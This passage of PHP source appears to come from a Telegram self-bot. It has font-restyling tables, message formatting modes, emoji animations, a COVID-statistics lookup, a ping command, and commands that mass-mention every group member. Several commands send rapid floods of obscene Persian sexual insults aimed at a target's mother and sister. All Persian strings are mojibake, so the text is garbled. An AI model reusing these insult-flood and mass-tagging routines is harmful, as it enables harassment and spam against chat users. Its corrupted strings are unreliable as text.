                        $_b = ['ุข', 'ุง', 'ุจู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ูพู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ุชู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ุซู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ุฌู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ฺู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ุญู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูโ', 'ุฎู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ุฏ?ชู', 'ุฐ?ชู', 'ุฑ?ชู', 'ุฒ?ชูโ', 'ฺ?ชู', 'ุณู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูโ', 'ุดู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ุตู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ุถู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ุทู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูโ', 'ุธู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ุนู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูโ', 'ุบู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ูู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ูู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูโ', 'ฺฉู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ฺฏู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูโ', 'ูู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูโ', 'ูู?ชูู?ชูู?ชูู?ชูู?ชูู?ชูโ', 'ูู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', 'ู', 'ูู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู', '?ู?ชูู?ชูู?ชูู?ชูู?ชูู?ชู'];
                        $_c = ['ุข', 'ุง', 'ุจููู', 'ูพูู', 'ุชููู', 'ุซูู', 'ุฌูู', 'ฺูู', 'ุญูู', 'ุฎูู', 'ุฏู', 'ุฐู', 'ุฑู', 'ุฒู', 'ฺู', 'ุณูู', 'ุดูู', 'ุตูู', 'ุถูู', 'ุทูู', 'ุธูู', 'ุนูู', 'ุบูู', 'ููู', 'ููู', 'ฺฉูู', 'ฺฏูู', 'ููู', 'ูููู', 'ูููู', 'ูู', 'ููู', '?ููู'];
                        $_d = ['ุข', 'ุง', 'ุจู๏นู', 'ูพู๏นู', 'ุชู๏นู', 'ุซู๏นูู', 'ุฌู๏นูู', 'ฺู๏นู', 'ุญู๏นู', 'ุฎู๏นู', 'ุฏ', 'ุฐ', 'ุฑ', 'ุฒ', 'ฺ', 'ุณู๏นู', 'ุดู๏นู', 'ุตู๏นูู', 'ุถู๏นู', 'ุทู๏นู', 'ุธู๏นูู', 'ุนู๏นู', 'ุบู๏นู', 'ูู๏นู', 'ูู๏นู', 'ฺฉู๏นู', 'ฺฏู๏นู', 'ูู๏นูู', 'ูู๏นู', 'ูู๏นู', 'ู', 'ูู๏นู', '?ู๏นู'];
                        $_e = ['ุข', 'ุง', 'ุจอูอูอูอู', 'ูพอูอูอูอู', 'ุชอูอูอูอู', 'ุซอูอูอูอู', 'ุฌอูอูอูอู', 'ฺูอูอูอู', 'ุญอูอูอูอู', 'ุฎูอูอูอู', 'ุฏ', 'ุฐ', 'ุฑ', 'ุฒ', 'ฺ', 'ุณูอูอูอู', 'ุดูอูอูอู', 'ุตอูอูอูอู', 'ุถอูอูอูอู', 'ุทอูอูอูอู', 'ุธูอูอูอูอู', 'ุนอูอูอูอู', 'ุบอูอูอูอู', 'ููอูอูอูอู', 'ููอูอูอู', 'ฺฉูอูอูอู', 'ฺฏูอูอูอูอู', 'ูอูอูอูอู', 'ูอูอูอูอู', 'ูอูอูอูอู', 'ู', 'ูอูอูอูอู', '?อูอูอูอู'];
                        $_f = ['ุข', 'ุงุุ', 'ุจูออกููุุูออู', 'ูพูออกููุุูออู', 'ุชูออกููุุูออู', 'ุซูออกููุุูออู', 'ุฌูออกููุุูออู', 'ฺูออกููุุูออู', 'ุญูออกููุุูออู', 'ุฎูออกููุุูออู', 'ุฏ? ? ', 'ุฐ', 'ุฑ', 'ุฒ', 'ฺ', 'ุณูออกููุุูออู', 'ุดูออกููุุูออู', 'ุตูออกููุุูออู', 'ุถูออกููุุูออู', 'ุทูออกููุุูออู', 'ุธูออกููุุูออู', 'ุนูออกููุุูออู', 'ุบูออกููุุูออู', 'ููออกููุุูออู', 'ููออกููุุูออู', 'ฺฉูออกููุุูออู', 'ฺฏูออกููุุูออู', 'ููออกููุุูออู', 'ููออกููุุูออู', 'ููออกููุุูออู', 'ู??', 'ููออกููุุูออู', '?ูออกููุุูออู'];
                        $_g = ['โุข', 'ุง', 'ุจูเฅู?ชูู?ชูู?ชูโออกููุุ', 'ูพูเฅู?ชูู?ชูู?ชูโออกููุุ', 'ุชูเฅู?ชูู?ชูู?ชูโออกููุุ', 'ุซูเฅู?ชูู?ชูู?ชูโออกููุุ', 'ุฌูเฅู?ชูู?ชูู?ชูโออกููุุ', 'ฺูเฅู?ชูู?ชูู?ชูโออกููุุ', 'ุญเฅู?ชูู?ชูู?ชูโออกููุุ', 'ุฎูเฅู?ชูู?ชูู?ชูโออกูู', 'โุฏ', 'ุฐเฅ', 'ุฑุุ', 'ุฒ?ชูโ', 'โฺเฅ', 'ุณูเฅู?ชูู?ชูู?ชูโออกููุุ', 'ุดูเฅู?ชูู?ชูู?ชูโออกููุุ', 'ุตเฅู?ชูู?ชูู?ชูโออกููุุ', 'ุถเฅู?ชูู?ชูู?ชูโออกููุุ', 'ุทเฅู?ชูู?ชูู?ชูโออกููุุ', 'ุธเฅู?ชูู?ชูู?ชูโออกููุุ', 'ุนูเฅู?ชูู?ชูู?ชูโออกููุุ', 'ุบูเฅู?ชูู?ชูู?ชูโออกููุุ', 'ููเฅู?ชูู?ชูู?ชูโออกููุุ', 'ููเฅู?ชูู?ชูู?ชูโออกููุุ', 'ฺชเฅู?ชูู?ชูู?ชูโออกููุุ', 'ฺฏูเฅู?ชูู?ชูู?ชูโออกููุุ', 'ููเฅู?ชูู?ชูู?ชูโออกููุุ', 'ููเฅู?ชูู?ชูู?ชูโออกููุุ', 'ููเฅู?ชูู?ชูู?ชูโออกููุุ', 'ููู', 'ููเฅู?ชูู?ชูู?ชูโออกููุุ', '?ูเฅู?ชูู?ชูู?ชูโออกููุุ'];
                        $_h = ['ุขูฐูููฐูโูอูโพู', 'ุงูฐูููฐูโูอูโพู', 'ุจูฐูููฐูโูอูโพู', 'ูพูฐูููฐูโูอูโพู', 'ุชูฐูููฐูโูอูโพู', 'ุซูฐูููฐูโูอูโพู', 'ุฌูฐูููฐูโูอูโพู', 'ฺูฐูููฐูโูอูโพู', 'ุญูฐูููฐูโูอูโพู', 'ุฎูฐูููฐูโูอูโพู', 'ุฏูฐูููฐูโูอูโพู', 'ุฐูฐูููฐูโูอูโพู', 'ุฑูฐูููฐูโูอูโพู', 'ุฒูฐูููฐูโูอูโพู', 'ฺูฐูููฐูโูอูโพู', 'ุณูฐูููฐูโูอูโพู', 'ุดูฐูููฐูโูอูโพู', 'ุตูฐูููฐูโูอูโพู', 'ุถูฐูููฐูโูอูโพู', 'ุทูฐูููฐูโูอูโพู', 'ุธูฐูููฐูโูอูโพู', 'ุนูฐูููฐูโูอูโพู', 'ุบูฐูููฐูโูอูโพู', 'ููฐูููฐูโูอูโพู', 'ููฐูููฐูโูอูโพู', 'ฺฉูฐูููฐูโูอูโพู', 'ฺฏูฐูููฐูโูอูโพู', 'ููฐูููฐูโูอูโพู', 'ููฐูููฐูโูอูโพู', 'ููฐูููฐูโูอูโพู', 'ููฐูููฐูโูอูโพู', 'ููฐูููฐูโูอูโพู', '?ูฐูููฐูโูอูโพู'];
                        $_i = ['ุขโบ? ? โค', 'ุงโบ? ? โค', 'ุจูออูออูออูโบ? ? โค', 'ูพูออูออูออูโบ? ? โค', 'ุชูออูออูออูโบ? ? โค', 'ุซโบ? ? โค', 'ุฌูออูออูออูโบ? ? โค', 'ฺูออูออูออูโบ? ? โค', 'ุญูออูออูออูโบ? ? โค', 'ุฎูออูออูออูโบ? ? โค', 'ุฏโบ? ? โค', 'ุฐโบ? ? โค', 'ุฑโบ? ? โค', 'ุฒโบ? ? โค', 'ฺโบ? ? โค', 'ุณูออูออูออูโบ? ? โค', 'ุดูออูออูออูโบ? ? โค', 'ุตูออูออูออูโบ? ? โค', 'ุถูออูออูออูโบ? ? โค', 'ุทูออูออูออูโบ? ? โค', 'ุธูออูออูออูโบ? ? โค', 'ุนูออูออูออูโบ? ? โค', 'ุบูออูออูออูโบ? ? โค', 'ููออูออูออูโบ? ? โค', 'ููออูออูออูโบ? ? โค', 'ฺฉูออูออูออูโบ? ? โค', 'ฺฏูออูออูออูโบ? ? โค', 'ููออูออูออูโบ? ? โค', 'ููออูออูออูโบ? ? โค', 'ููออูออูออูโบ? ? โค', 'ูโบ? ? โค', 'ูโค', '?ูออูออูออูโบ? ? โค'];
                        $_j = ['ุขโญ', 'ุงโญ', 'ุจูออกูออกโญ', 'ูพูออกูออกโญ', 'ุชูออกูออกโญ', 'ุซูออกูออกูออกโญ', 'ุฌูออกูออกโญ', 'ฺููออกูออกโญ', 'ุญูออกูออกโญ', 'ุฎููออกูออกโญ', 'ุฏโญ', 'ุฐโญ', 'ุฑโญ', 'ุฒออกโญ', 'ูออกฺออกโญ', 'ุณููออกูออกโญ', 'ุดูออกูออกูออกโญ', 'ุตูออกูออกโญ', 'ุถูออกูออกโญ', 'ุทูออกูออกโญ', 'ุธูออกูออกโญ', 'ุนูออกูออกโญ', 'ุบูออกูออกโญ', 'ูููออกูออกโญ', 'ููออกูออกูออกโญ', 'ฺชููออกูออกโญ', 'ฺฏูออกูออกโญ', 'ููออกูออกูออกโญ', 'ููออกูออกูออกโญ', 'ููออกูออกโญ', 'ูออกูออกูออกโญ', 'ููออกูออกูออกโญ', '?ูออกูออกโญ'];
                        $FAar = array($_a, $_b, $_c, $_d, $_e, $_f, $_g, $_h, $_i, $_j);
                        $FontFA = $FAar[array_rand($FAar)];
                        $FA = ['ุข', 'ุง', 'ุจ', 'ูพ', 'ุช', 'ุซ', 'ุฌ', 'ฺ', 'ุญ', 'ุฎ', 'ุฏ', 'ุฐ', 'ุฑ', 'ุฒ', 'ฺ', 'ุณ', 'ุด', 'ุต', 'ุถ', 'ุท', 'ุธ', 'ุน', 'ุบ', 'ู', 'ู', 'ฺฉ', 'ฺฏ', 'ู', 'ู', 'ู', 'ู', 'ู', '?'];
                        $od8 = str_replace($FA, $FontFA, $matnFA);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "$od8", 'parse_mode' => 'Markdown']);
                    }

                    if ($boldmode == "on") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**$text**", 'parse_mode' => 'Markdown']);
                    }
                    if ($mentionmode == "on") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "[$text](mention:$fromId)", 'parse_mode' => 'Markdown']);
                    }
                    if ($mention2mode == "on") {
                        $idyaro = yield $this->getLocalContents('mentionid.txt');
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "[$text](mention:$idyaro)", 'parse_mode' => 'Markdown']);
                    }
                    if ($codingmode == "on") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "`$text`", 'parse_mode' => 'Markdown']);
                    }
                    if ($strikethrough == "on") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "<del>$text</del>", 'parse_mode' => 'HTML']);
                    }
                    if ($undermode == "on") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "<u>$text</u>", 'parse_mode' => 'HTML']);
                    }
                    if ($italic == "on") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "__$text__", 'parse_mode' => 'Markdown']);
                    }
                    if ($hashtagmode == "on") {
                        $tag = "#" . $text;
                        $tags = str_replace(' ', "_", $tag);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => $tags]);
                    }
                    if ($partmode == "on") {
                        if (strlen($text) < 150) {
                            $text = str_replace(" ", "โ", $text);
                            for ($T = 1; $T <= mb_strlen($text); $T++) {
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => mb_substr($text, 0, $T)]);
                                yield $this->sleep(0.1);
                            }
                        }
                    }

                    if ($text == 'ฺฉุตููุช' or $text == 'ksnne') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ฺฉููู']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ฺฉููุต']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ฺฉููุต ู']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ฺฉูููุต ูููููู']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ฺฉูููุต ููููุชู']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฺฉุต ููููุช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅฺฉูููุต ููููุช ุฏ?ฺฏู๐ฅ']);
                    }

                    if ($text == '2ุดูุงุฑุด') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1โฃ1โฃ
1โฃ1โฃ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '2โฃ2โฃ
2โฃ2โฃ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '3โฃ3โฃ
3โฃ3โฃ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '4โฃ4โฃ
4โฃ4โฃ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '5โฃ5โฃ
5โฃ5โฃ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '6โฃ6โฃ
6โฃ6โฃ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '7โฃ7โฃ
7โฃ7โฃ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '8โฃ8โฃ
8โฃ8โฃ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '9โฃ9โฃ
9โฃ9โฃ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐
๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1โฃ1โฃ
1โฃ1โฃ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1โฃ2โฃ
1โฃ2โฃ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1โฃ3โฃ
1โฃ3โฃ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1โฃ4โฃ
1โฃ4โฃ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '1โฃ5โฃ
1โฃ5โฃ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅโุต?ฺฉุช?ุฑ ุดูุงุฑุด ุฎูุฑุฏ?๐ฅ']);
                    } else if (preg_match("/^[\/\#\!]?(corona) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(corona) (.*)$/si", $text, $p);
                        $cron = $p[2];
                        $linkcrona = json_decode(yield $this->fileGetContents("https://api.codebazan.ir/corona/?type=country&country=$cron"), true);
                        $link22 = $linkcrona["result"];
                        $crona1 = $link22['last_updated'];
                        $crona2 = $link22['continent'];
                        $crona3 = $link22['country'];
                        $crona4 = $link22['cases'];
                        $crona5 = $link22['deaths'];
                        $crona6 = $link22['recovered'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => " 
ุขุฎุฑ?ู ุจุฑูุฒุฑุณุงู?โป๏ธ:
$crona1
ฺฉุดูุฑ๐ฉ: 
$crona3 
ุงูุงุฑ ูุจุชูุง?ุงูโ ๏ธ: 
$crona4 
ุงูุงุฑ ูุฑฺฏ ู ู?ุฑ๐ด: 
$crona5 
ุงูุงุฑ ุจูุจูุฏ ?ุงูุชู๐ข : 
$crona6 
        "]);
                    }
                    if (preg_match("/^[\/\#\!]?(ping) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(ping) (.*)$/si", $text, $m);
                        $domain = $m[2];
                        $port = 80;
                        $starttime = microtime(true);
                        $file = fsockopen($domain, $port, $s, $s, 1);
                        $stoptime = microtime(true);
                        fclose($file);
                        $ping = floor(($stoptime - $starttime) * 1000);
                        yield $this->messages->editMessage([
                            'peer' => $peer,
                            'id' => $msg_id,
                            'message' => "๊ฑษชแดแด แดษชษดษข ษช๊ฑ: " . $ping . 'ms'
                        ]);
                    }
                    if (preg_match("/^[\/\#\!]?(selfping)$/si", $text)) {
                        $domain = 'tcp://149.154.167.51';
                        $port = 443;
                        $starttime = microtime(true);
                        $file = fsockopen($domain, $port, $s, $s, 1);
                        $stoptime = microtime(true);
                        fclose($file);
                        $ping = floor(($stoptime - $starttime) * 1000);
                        yield $this->messages->editMessage([
                            'peer' => $peer,
                            'id' => $msg_id,
                            'message' => "Ping: " . $ping . 'ms'
                        ]);
                    }
                    if (preg_match("/^[\/\#\!]?(tagall)(.*)$/si", $text)) {
                        $chat = yield $this->getPwrChat($peer);
                        $chats = $chat['participants'];
                        while (sizeof($chats) >= 4) {
                            $spl = $chats;
                            $Safa = false;
                            $chats = array_splice($spl, 4);
                            foreach ($spl as $number => $up) {
                                $id = $up['user']['id'];
                                $Safa .= $number + 1 . "-[$id](tg://user?id=$id) ";
                            }
                            yield $this->messages->sendMessage([
                                'peer' => $peer,
                                'message' => "๐๐น๐น ๐จ๐๐ฒ๐ฟ๐ ๐๐ป ๐๐ฅ๐ข๐จ๐ฃ :\n$Safa",
                                'parse_mode' => 'Markdown'
                            ]);
                        }
                        $Safa = false;
                        foreach ($chats as $number => $up) {
                            $id = $up['user']['id'];
                            if ($up['user']['type'] == "user")
                                $Safa .= $number + 1 . "-[$id](tg://user?id=$id) ";
                        }
                        yield $this->messages->sendMessage([
                            'peer' => $peer,
                            'message' => "๐๐น๐น ๐จ๐๐ฒ๐ฟ๐ ๐๐ป ๐๐ฅ๐ข๐จ๐ฃ :\n$Safa",
                            'parse_mode' => 'Markdown'
                        ]);
                        return;
                    }

                    if (preg_match("/^[\/\#\!]?(tagonline)$/si", $text)) {
                        $lis = [];
                        $ChatOnlines = yield $this->messages->getOnlines(['peer' => $peer,]);
                        foreach ($ChatOnlines['participants'] as $ajbs) {
                            if (isset($ajbs['user']['username']))
                                $lis[] = $ajbs['user']['username'];
                        }
                        foreach ($lis as $Amir) {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$Amir \n"]);
                        }
                    }
                    if ($text == 'ููุจุฒ' or $text == 'qlb2') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐๐๐งกโค๏ธ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐ค']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โค๏ธ๐ค๐งก๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ค๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ค๐คโค๏ธ๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ค๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โค๏ธ๐ค๐ค๐งก']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐ค']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐โค๏ธ๐ค']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งก๐๐งก๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐โค๏ธ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐ค๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐งกโค๏ธ๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐I LOVE YOU๐๐ฅ']);
                    }
                    if ($text == 'ููฺฉ' or $text == 'moc') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ช๐ฉ๐จโฌ๏ธ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐จ๐ฉ๐ฆ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ช๐ฆ๐ฅ๐ฉ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโฌ๏ธโฌ๏ธ๐ช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐จ๐ฆ๐ช๐ฉ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅโฌ๏ธ๐ช๐ฆ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ฉ๐ซ๐จ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ณ๐ฒโป๏ธ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โช๏ธโซ๏ธโฝ๏ธโผ๏ธ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โป๏ธโผ๏ธโฝ๏ธโช๏ธ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ช๐ฆ๐จ๐ช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅโฌ๏ธ๐ช๐ฉ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐จ๐ฅ๐ฆ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๐ฆ๐ฉ๐ช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ณ๐ฒ๐ช๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ EnD ๐ฅ']);
                    }
                    if ($text == 'ุฎูุฏู' or $text == 'khodam') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ย ย ย 
ย ย ย *๏ผ ใคย  *   ใใใ((( ใฝ*โค
โ(ใ ๏พใใใใ ๏ฟฃ๏ผน๏ผผโ
โ| (๏ผผใ(\๐ฉ/)ย ย  ๏ฝย ย ย  )โโค
โใฝใใฝ` ( อกยฐ อส อกยฐ) _ใย ย ย  /โ โค
ใโ๏ผผ |ใโ๏ผนโใ/ย  /โโค
ใโ๏ฝใฝใ ๏ฝใ ๏พ ๏ผโโค
ใ โ๏ผผใใผไปใผใคโโค
ใใ โ๏ฝ ใๅๅฝก |โโค
ย ย ย ย ย ย ย ย  โ) \ย ย ย ย ย  ยฐย ย ย ย  /โโค
ย ย ย ย ย ย ย ย  โ(ย ย ย ย  \       /โlโค
ย ย ย ย ย ย ย ย  โ/ย ย ย ย ย ย  /   \ \  \
ย ย ย ย ย  โ/ย  /ย ย ย ย  /ย ย ย ย ย  \ \ย ย  \โ 
ย ย ย ย ย  โ( (ย ย ย  ).ย ย ย ย ย ย ย ย ย ย  ) ).ย  )โโค
ย ย ย ย  โ(ย ย ย ย ย  ).ย ย ย ย ย ย ย ย ย ย ย  ( |ย ย ย  |โ 
ย ย ย ย ย  โ|ย ย ย  /ย ย ย ย ย ย ย ย ย ย ย ย ย ย ย  \ย ย ย  |โโค
ย ย ย ย ย ย ย ย ย โอย ใอโฌอโอใอโอโอโอ
ย อโอย โอโอโอใอ๏ผผอ๏ฝอ๏ผอใอย โอย โอโฌอโอย โอโอโอโอ
โอย อโอย  *อ๐๐๐ฆ๐ ๐ข๐๐๐ *
ย อย โอโอโอโอใอ๏ผอ๏ฝอ๏ผผอใอย โอย โอโฌอโอโอโอโอโอ
โอโอโอใอโอย ใอโฌอโอใอโอโอโอโอ']);
                    }
                    if ($text == 'ฺฉูุตู' or $text == 'ฺฉูุตู ุจุดู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๏ผ"]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ููุชุดู ฺฉูุณู ุจุดู", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ุชู ุฏุฑ?ุง? ุจ? ฺฉุฑุงู ููุช ุดูุง ฺฉูู", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ููุชู ุจู ุฏูุฏูู ุจฺฏ?ุฑู", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ูุฑุฏู ฺฉูู?", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ฺฉ?ุฑู ุชู ูุงุฏุฑุช", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ููู ูุงู?", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ููุช ุจฺฏุงู", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ููุชุดู ุบ?ุฑุชุช ุจฺฏ?ุฑู", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ููุช ุฏููู ุฎูุงุฑ ฺฉูู?", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ุชู ุชู ฺฉุต ูุงุฏุฑุช", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ฺฉุต ููุช ฺฏุงุฒ ุจฺฏ?ุฑู", 'id' => $msg_id + 1]);
                    }
                    if ($text == 'ฺฉุตูุงุฏุฑุช' or $text == 'ููุดู ุจฺฉู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๏ผ"]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ฺฉุต ููุช ุจุงูุง ุจุงุด", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ุจุฑุง ุจุงุจุงุช ุดุงุฎ ูุดู ุจ?ูุงููุต", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ุจุฏุจุฎุช ฺููุด ?ุช?ู ุฒุงุฏู ูุงุฏุฑุชู ฺฏุง??ุฏู", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ูุงุฏุฑุชู ู?ฺฉุดู", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ุงุจูุญ ุฒุงุฏู ุฎุฑ ูุงููุณ", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ุจฺฏู ฺฏูู ุฎูุฑุฏู ุจุฑุง? ูพุฏุฑู ุดุงุฎ ุดุฏู", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ุงุดุนู ูุง? ูุฑุงุจููุด", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ุชู ฺฉุต ุฎูุงุฑุช", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ูุงุฏุฑุช ฺฉุต ุดุฏ", 'id' => $msg_id + 1]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ฺฉ?ุฑ ุจู ฺฉุต ููุช ุจุง ูููู?ุช ฺฏุฐุงุดุชู ุดุฏ", 'id' => $msg_id + 1]);
                    }
                    /*================ุณุฑฺฏุฑู? ุง?ูุฌฺฉุชูุฑ=============*/
                    if ($text == 'ุฎุง?ูุงูู ุณฺฏ ุจฺฏุงุฏ' or $text == 'ุฎุง?ูุงู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐                 โข ๐ซ๐ถ"]);
